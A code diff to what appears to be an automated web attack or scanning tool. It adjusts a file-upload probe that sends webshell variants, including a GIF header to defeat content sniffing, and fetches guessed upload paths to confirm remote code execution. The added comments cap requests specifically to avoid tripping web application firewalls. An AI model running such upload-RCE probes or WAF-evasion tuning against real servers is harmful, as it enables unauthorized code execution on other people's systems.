@@ -1626,8 +1626,12 @@ def _upload_shells(salt: str) -> tuple[bytes, bytes, bytes]:
 
 
 _GIF_MAGIC = b"GIF89a"                     # a real image magic header to defeat content-sniffing
-_UPLOAD_DIRS = ("", "uploads/", "upload/", "files/", "file/", "images/", "img/", "media/",
-                "hackable/uploads/", "assets/uploads/", "static/uploads/", "tmp/", "data/uploads/")
+_UPLOAD_DIRS = ("", "uploads/", "upload/", "files/", "images/", "media/", "static/uploads/")
+# Total-request budget for the upload probe. Its fan-out (forms x 10 bypass variants x [1 upload + N
+# dir-fetches]) hit ~140 requests/app, tripping the WAF on 87 v17 apps for 0 fires — the #2 re-challenge
+# straw (after cmdi). Bound it: the top bypass shapes x the common dirs catch a real upload-RCE; the long
+# speculative tail was only re-antagonizing the WAF. Matches the cmdi/lfi/ssti/xxe fan-out caps.
+_UPLOAD_BUDGET = 40
 
 
 def _upload_variants(salt: str):
@@ -1675,17 +1679,24 @@ def file_upload(ctx, probe) -> bool | None:
     want = hashlib.sha256(salt.encode()).hexdigest()   # only genuine execution of the uploaded code yields this
     variants = _upload_variants(salt)
     tested = False
+    sent = 0
     with make_client(ctx.base_url, ctx.headers, timeout=15.0, follow_redirects=True) as c:
         for f in forms:
             for filename, ctype, body in variants:
+                if sent >= _UPLOAD_BUDGET:
+                    break
                 tested = True
                 files = {ff: (filename, body, ctype) for ff in f.file_fields}
                 data = {fn: _XSS_FILLER for fn in f.fields if fn not in f.file_fields}
+                sent += 1
                 try:
                     resp = c.request((f.method or "post").upper(), f.action, files=files, data=data)
                 except (httpx.HTTPError, httpx.InvalidURL):
                     continue
                 for url in _locate_upload(resp.text, filename):
+                    if sent >= _UPLOAD_BUDGET:
+                        break
+                    sent += 1
                     try:
                         got = c.get(url)
                         if want in got.text:
@@ -1694,7 +1705,9 @@ def file_upload(ctx, probe) -> bool | None:
                             return True  # the uploaded webshell hashed the salt server-side -> RCE via upload
                     except (httpx.HTTPError, httpx.InvalidURL):
                         continue
-    ctx.evidence.update(rce=False, forms=len(forms), variants=len(variants))
+            if sent >= _UPLOAD_BUDGET:
+                break
+    ctx.evidence.update(rce=False, forms=len(forms), variants=len(variants), requests=sent)
     return False if tested else None
 
 
